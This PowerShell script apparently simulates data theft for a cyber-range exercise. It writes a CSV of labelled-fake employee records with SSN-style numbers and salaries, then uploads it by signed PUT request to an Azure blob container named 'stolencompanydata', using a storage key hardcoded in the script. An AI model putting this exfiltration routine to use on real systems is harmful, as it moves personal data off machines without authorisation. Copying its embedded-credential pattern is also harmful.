 # Define variables
$currentDateTime = Get-Date -Format "yyyyMMddHHmmss"
$filePath = "C:\ProgramData\employee-data-$($currentDateTime).csv"
$tempFilePath = "C:\ProgramData\employee-data-temp$($currentDateTime).csv"

# Check if the file exists and delete it
if (Test-Path $filePath) {
    Remove-Item $filePath
    Write-Host "File deleted: $filePath"
}

# Create the employee data with fake information
$employeeData = @"
$($currentDateTime)
FirstName,LastName,SSN,PhoneNumber,Salary,DOB
Travis,Ward,294-75-2745,(703)785-1895,79976.31,1984-11-10
Paul,Berry,785-68-1220,001-875-136-8234x217,66220.38,1969-02-23
Melanie,Torres,798-26-7805,+1-859-649-5409x3178,104821.2,1981-06-14
Megan,Love,789-96-1833,(544)717-7146x5548,49336.29,1964-05-09
Nancy,Brown,448-92-8270,+1-976-719-2461,43415.96,1989-01-18
Ronald,Kelley,947-24-6372,001-956-655-9114x689,66858.32,1971-09-11
Tonya,Lawson,110-66-4164,480-385-6993x7416,72410.64,1980-05-23
George,Jones,118-70-8423,+1-325-661-2626x488,44743.12,1966-04-26
Alfred,Robertson,303-16-1933,895.563.9413,62089.35,1987-12-14
Edward,Griffith,844-74-5059,+1-971-816-4131,78596.12,1995-12-28
Michele,Valdez,140-43-5385,001-351-608-0492x8256,101905.26,1968-01-12
Joyce,Carter,353-41-1786,600-088-9352,43392.92,1964-06-06
Jeffrey,Christensen,102-71-2038,001-264-476-4371x170,65361.08,1994-06-29
Elizabeth,Blackwell,478-41-2992,+1-218-548-4035x524,102903.39,2002-02-02
Sierra,Johnson,218-12-3956,422-314-3695,53764.55,1999-07-20
Erin,Leonard,335-11-4661,(922)945-1817,77259.16,1974-04-03
Melissa,Andersen,634-91-1706,669-170-0443x249,48053.83,1993-10-31
Kelly,Ortiz,401-79-9217,001-715-006-2830x348,110743.58,1975-10-17
Jose,Medina,163-16-4868,(987)217-0014,113217.13,1971-12-09
Laura,Jackson,507-80-1296,7116296822,55325.76,1984-12-26
Scott,Lee,851-35-7779,(433)924-6670,86805.65,1964-05-14
Jennifer,Bailey,653-61-5407,+1-477-990-1147,46842.92,1966-06-13
James,Joseph,529-47-3318,+1-784-674-3609x02334,50823.1,1996-05-25
Guy,Myers,939-76-2817,597.604.3929,88212.94,1998-11-08
Jillian,Davis,230-50-1561,001-958-528-5325x5814,44387.2,1966-10-22
Judy,Walker,566-45-5908,0931914425,46469.43,1973-01-04
Nicole,Reeves,991-96-8289,791-042-3976x339,112911.26,1989-06-23
Scott,Dean,919-58-9062,660-594-9013x593,61005.71,1984-05-10
Eric,Howell,929-81-6672,+1-975-492-6918x133,110657.57,1975-06-27
Donald,Ramirez,151-11-4511,+1-950-537-3618x583,56339.03,1975-03-07
"@

# Write the employee data to the temporary CSV file
$employeeData | Out-File -FilePath $tempFilePath -Encoding UTF8

# Rename the temporary file to the original file name
Rename-Item -Path $tempFilePath -NewName $filePath
Write-Host "File created and renamed to: $filePath"

# Define Azure Blob Storage variables
$storageUrl = "https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.csv"
$storageAccount = "sacyberrangedanger"
$storageKey = "p5s3pxy+U3VRp3c64ueC8FI87M8+SOWkQzUUiI20steaoowL4P8Rc3wNPL8VNYOSH/w3JSdCS4+c+ASt3tqNng=="
$blobType = "BlockBlob"  # You can change this to AppendBlob or PageBlob if needed

# Extract the container and blob name from the URL
$containerName = "stolencompanydata"
$blobName = "employee-data.csv"

# Define the date and headers
$dateString = [DateTime]::UtcNow.ToString("R")
$version = "2021-08-06"
$contentType = "application/octet-stream"
$fileContent = [System.IO.File]::ReadAllBytes($filePath)  # Read the file as a byte array
$contentLength = $fileContent.Length

# Construct the canonicalized resource and headers
$canonicalizedResource = "/$storageAccount/$containerName/$blobName"
$canonicalizedHeaders = "x-ms-blob-type:$blobType`nx-ms-date:$dateString`nx-ms-version:$version"

# Create the string to sign
$stringToSign = "PUT`n`n`n$contentLength`n`n$contentType`n`n`n`n`n`n`n$canonicalizedHeaders`n$canonicalizedResource"

# Create the signature for authorization
$hmacsha256 = New-Object System.Security.Cryptography.HMACSHA256
$hmacsha256.Key = [Convert]::FromBase64String($storageKey)
$signatureBytes = $hmacsha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($stringToSign))
$signature = [Convert]::ToBase64String($signatureBytes)

# Prepare headers
$headers = @{
    "x-ms-date"        = $dateString
    "x-ms-version"     = $version
    "Authorization"    = "SharedKey $($storageAccount):$($signature)"
    "x-ms-blob-type"   = $blobType
    "Content-Length"   = $contentLength
    "Content-Type"     = $contentType
}

# Upload the blob using Invoke-WebRequest
Invoke-WebRequest -Uri $storageUrl -Method Put -Headers $headers -InFile $filePath
 
